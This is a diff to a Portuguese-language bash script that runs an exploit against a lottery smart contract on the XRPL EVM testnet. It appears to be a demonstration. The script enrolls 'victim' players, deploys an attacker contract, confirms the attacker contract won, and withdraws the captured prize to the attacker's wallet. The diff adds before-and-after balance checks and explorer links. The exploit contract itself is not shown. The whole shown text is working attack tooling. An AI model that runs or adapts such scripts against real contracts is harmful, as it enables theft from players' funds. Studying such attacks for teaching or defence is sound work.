@@ -26,10 +26,16 @@ TENTATIVAS=${TENTATIVAS:-60}
 enviar() { cast send "$@" --rpc-url "$RPC" --account "$ACCOUNT" --password "$SENHA"; }
 ler()    { cast call "$@" --rpc-url "$RPC"; }
 
+# Carteira que assina tudo = dono do atacante = quem RECEBE o prêmio no final.
+DONO=$(cast wallet address --account "$ACCOUNT" --password "$SENHA")
+
 echo "========================================================"
 echo " Sorteio:  $SORTEIO"
 echo " Jogadores agora: $(ler "$SORTEIO" 'totalJogadores()(uint256)')"
 echo "========================================================"
+
+# Saldo da sua carteira ANTES de toda a operação (para comparar no final).
+SALDO_ANTES=$(cast balance "$DONO" --rpc-url "$RPC" --ether)
 
 # ---------------------------------------------------------------------------
 # 1. Jogadores honestos (as "vítimas"). Pulado com PULAR_HONESTOS=1.
@@ -48,9 +54,9 @@ fi
 echo
 echo ">> deploy do atacante"
 ATACANTE=$(forge create script/AtacanteLive.sol:AtacanteLive \
-  --constructor-args "$SORTEIO" \
   --rpc-url "$RPC" --account "$ACCOUNT" --password "$SENHA" \
-  --broadcast --json | jq -r '.deployedTo')
+  --broadcast --json \
+  --constructor-args "$SORTEIO" | jq -r '.deployedTo')
 echo "   Atacante: $ATACANTE"
 
 # ---------------------------------------------------------------------------
@@ -83,11 +89,18 @@ fi
 # ---------------------------------------------------------------------------
 echo
 echo ">> último vencedor: $(ler "$SORTEIO" 'ultimoVencedor()(address)')"
-echo "   (deve ser o atacante: $ATACANTE)"
+echo "   (deve ser o CONTRATO atacante: $ATACANTE)"
 echo
-echo ">> sacando o prêmio para o dono"
+PREMIO=$(cast balance "$ATACANTE" --rpc-url "$RPC" --ether)
+echo ">> prêmio capturado, parado no contrato atacante: $PREMIO XRP"
+echo
+echo ">> sacando o prêmio para a SUA carteira ($DONO)"
 enviar "$ATACANTE" "sacar()" >/dev/null
-echo "   saldo do atacante agora: $(cast balance "$ATACANTE" --rpc-url "$RPC" --ether) XRP"
+SALDO_DEPOIS=$(cast balance "$DONO" --rpc-url "$RPC" --ether)
+echo "   contrato atacante agora: $(cast balance "$ATACANTE" --rpc-url "$RPC" --ether) XRP (zerado — foi tudo pra sua carteira)"
+echo "   sua carteira ANTES de tudo: $SALDO_ANTES XRP"
+echo "   sua carteira AGORA:         $SALDO_DEPOIS XRP"
 echo
 echo "FIM. Veja no explorer:"
-echo "   https://explorer.testnet.xrplevm.org/address/$ATACANTE"
+echo "   Sorteio:  https://explorer.testnet.xrplevm.org/address/$SORTEIO"
+echo "   Atacante: https://explorer.testnet.xrplevm.org/address/$ATACANTE"
